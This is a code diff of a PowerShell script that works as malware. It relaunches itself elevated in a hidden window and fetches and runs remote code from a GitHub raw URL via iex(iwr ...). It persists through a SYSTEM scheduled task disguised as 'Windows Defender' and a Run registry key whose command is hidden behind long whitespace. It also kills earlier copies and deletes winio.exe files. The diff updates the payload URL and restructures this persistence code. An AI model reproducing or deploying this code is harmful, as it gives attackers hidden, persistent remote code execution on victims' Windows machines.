@@ -28,7 +28,7 @@ public class WindowHelper
 # Run as Administrator
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
-    $newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();
+    $newProc = Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();
     exit;
 }
 else
@@ -106,10 +106,14 @@ else
     #           PERSISTANCE
     # ----------------------------- # 
     # Add persistence on startup to execute command
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"iNVOkE-eXPreSSIon (iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP).Content`"";
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"iNVOkE-eXPreSSIon (iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/2' -UseBasicP).Content`"";
     $trigger = New-ScheduledTaskTrigger -AtLogOn;
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
-    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftWindowsDefender" -Value "                                                                                                                                                                                        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)";
+    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
+    Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;
+    
+    # Add registry path
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftWindowsDefender" -Value "                                                                                                                                                                                        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/2' -UseBasicP)";
     
     # Check for previous version (TERMINATE BY FILE PATH)
     $filePaths = @(
@@ -189,6 +193,25 @@ else
     catch 
     {
         # Write-Output "Mutex $mutexName not found or process does not hold the mutex."
+    }
+
+    try {
+        # Attempt to delete the file or directory
+        if (Test-Path "C:\\Windows\\System32\\SafeBoot\\winio.exe")
+        {
+            Remove-Item -Path "C:\\Windows\\System32\\SafeBoot\\winio.exe" -Force -Recurse -ErrorAction Continue
+        }
+
+        # Attempt to delete the file or directory
+        if (Test-Path "C:\\Windows\\System32\\winio.exe")
+        {
+            Remove-Item -Path "C:\\Windows\\System32\\winio.exe" -Force -Recurse -ErrorAction Continue
+        }
+
+        # Write-Output "Deleted $filePath"
+    } catch {
+        # Silently catch and handle any errors
+        # Write-Output "Failed to delete $filePath. Error: $_"
     }
 
     # ----------------------------- #
